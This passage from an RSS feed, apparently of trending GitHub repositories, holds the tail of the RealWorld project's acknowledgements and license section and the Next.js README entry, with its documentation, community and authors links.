 &lt;li&gt;&lt;strong&gt;TodoMVC&lt;/strong&gt; (&lt;a href=&quot;https://github.com/tastejs/todomvc#team&quot;&gt;team &amp;amp; contributors&lt;/a&gt;) for their exemplary &amp;amp; successful work; their project &amp;amp; org has been an invaluable analogy for us as we&#39;ve built out RealWorld&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;James Brewer&lt;/strong&gt; (docs contributor to Django) for countless brainstorming sessions, helping name this project, and creating the Django codebase + tutorial&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;License&lt;/h1&gt; 
&lt;p&gt;All of the codebases are &lt;strong&gt;MIT licensed&lt;/strong&gt; unless otherwise specified.&lt;/p&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;p&gt;&lt;a href=&quot;https://thinkster.io&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/gothinkster/realworld/master/media/end.png&quot; alt=&quot;Brought to you by Thinkster&quot;&gt;&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>vercel/next.js</title>
      <link>https://github.com/vercel/next.js</link>
      <description>&lt;p&gt;The React Framework&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Getting Started&lt;/h2&gt; 
&lt;p&gt;Visit 
 &lt;!-- raw HTML omitted --&gt;https://nextjs.org/learn
 &lt;!-- raw HTML omitted --&gt; to get started with Next.js.&lt;/p&gt; 
&lt;h2&gt;Documentation&lt;/h2&gt; 
&lt;p&gt;Visit &lt;a href=&quot;https://nextjs.org/docs&quot;&gt;https://nextjs.org/docs&lt;/a&gt; to view the full documentation.&lt;/p&gt; 
&lt;h2&gt;Who is using Next.js?&lt;/h2&gt; 
&lt;p&gt;Next.js is used by the world&#39;s leading companies. Check out the &lt;a href=&quot;https://nextjs.org/showcase&quot;&gt;Next.js Showcase&lt;/a&gt; to learn more.&lt;/p&gt; 
&lt;h2&gt;Community&lt;/h2&gt; 
&lt;p&gt;The Next.js community can be found on &lt;a href=&quot;https://github.com/vercel/next.js/discussions&quot;&gt;GitHub Discussions&lt;/a&gt;, where you can ask questions, voice ideas, and share your projects.&lt;/p&gt; 
&lt;p&gt;To chat with other community members you can join the &lt;a href=&quot;https://nextjs.org/discord&quot;&gt;Next.js Discord&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Our &lt;a href=&quot;https://github.com/vercel/next.js/blob/canary/CODE_OF_CONDUCT.md&quot;&gt;Code of Conduct&lt;/a&gt; applies to all Next.js community channels.&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;Please see our &lt;a href=&quot;https://raw.githubusercontent.com/vercel/next.js/canary/contributing.md&quot;&gt;contributing.md&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Authors&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Tim Neutkens (&lt;a href=&quot;https://twitter.com/timneutkens&quot;&gt;@timneutkens&lt;/a&gt;) ‚Äì &lt;a href=&quot;https://vercel.com/about/timneutkens&quot;&gt;Vercel&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Naoyuki Kanezawa (&lt;a href=&quot;https://twitter.com/nkzawa&quot;&gt;@nkzawa&lt;/a&gt;) ‚Äì &lt;a href=&quot;https://vercel.com/about/nkzawa&quot;&gt;Vercel&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Guillermo Rauch (&lt;a href=&quot;https://twitter.com/rauchg&quot;&gt;@rauchg&lt;/a&gt;) ‚Äì &lt;a href=&quot;https://vercel.com/about/rauchg&quot;&gt;Vercel&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Arunoda Susiripala (&lt;a href=&quot;https://twitter.com/arunoda&quot;&gt;@arunoda&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;Tony Kovanen (&lt;a href=&quot;https://twitter.com/tonykovanen&quot;&gt;@tonykovanen&lt;/a&gt;)&lt;/li&gt; 
 &lt;li&gt;Dan Zajdband (&lt;a href=&quot;https://twitter.com/impronunciable&quot;&gt;@impronunciable&lt;/a&gt;)&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
  </channel>
</rss>
